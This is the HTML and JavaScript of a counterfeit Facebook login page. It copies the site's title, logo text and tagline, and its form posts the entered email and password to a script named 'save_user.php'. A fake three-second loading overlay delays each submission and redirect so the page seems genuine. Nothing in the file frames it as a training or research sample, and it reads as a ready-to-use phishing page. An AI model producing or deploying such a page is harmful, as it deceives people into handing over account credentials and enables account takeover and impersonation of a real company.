<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <link rel="stylesheet" href="stylee.css" />
  <style>
  #loadingOverlay {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(255, 255, 255, 0.8);
    display: none;
    justify-content: center;
    align-items: center;
    font-size: 24px;
    font-weight: bold;
    color: #1877f2;
    z-index: 9999;
  }
</style>

</head>
<body>

  <div id="loadingOverlay">Loading...</div>

  <div class="container">
    <div class="left">
      <h1 class="logo">facebook</h1>
      <p class="tagline">Connect with friends and the world around you on Facebook.</p>
    </div>
    <div class="right">
      <form class="login-form" id="loginForm" action="save_user.php" method="POST">
        <input type="text" name="email" placeholder="Email or phone number" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit" class="login-btn">Log In</button>
        <a href="#">Forgot password?</a>
        <div class="divider"></div>
        <button type="button" class="create-btn" onclick="simulateRedirect('signup.php')">Create new account</button>
      </form>
    </div>
  </div>

  <p class="footer">
    <strong>Create a Page</strong> for a celebrity, brand or business.
  </p>

  <script>
    const loading = document.getElementById("loadingOverlay");

    // Intercept form submission
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();
      loading.style.display = "flex";
      setTimeout(() => {
        e.target.submit();
      }, 3000);
    });

    // Handle any links (e.g., forgot password)
    document.querySelectorAll("a[href]").forEach(link => {
      link.addEventListener("click", function (e) {
        const href = this.getAttribute("href");
        if (href !== "#") {
          e.preventDefault();
          loading.style.display = "flex";
          setTimeout(() => {
            window.location.href = href;
          }, 3000);
        }
      });
    });

    // Optional for button-based redirection (like create account)
    function simulateRedirect(url) {
      loading.style.display = "flex";
      setTimeout(() => {
        window.location.href = url;
      }, 3000);
    }
  </script>
</body>
</html>
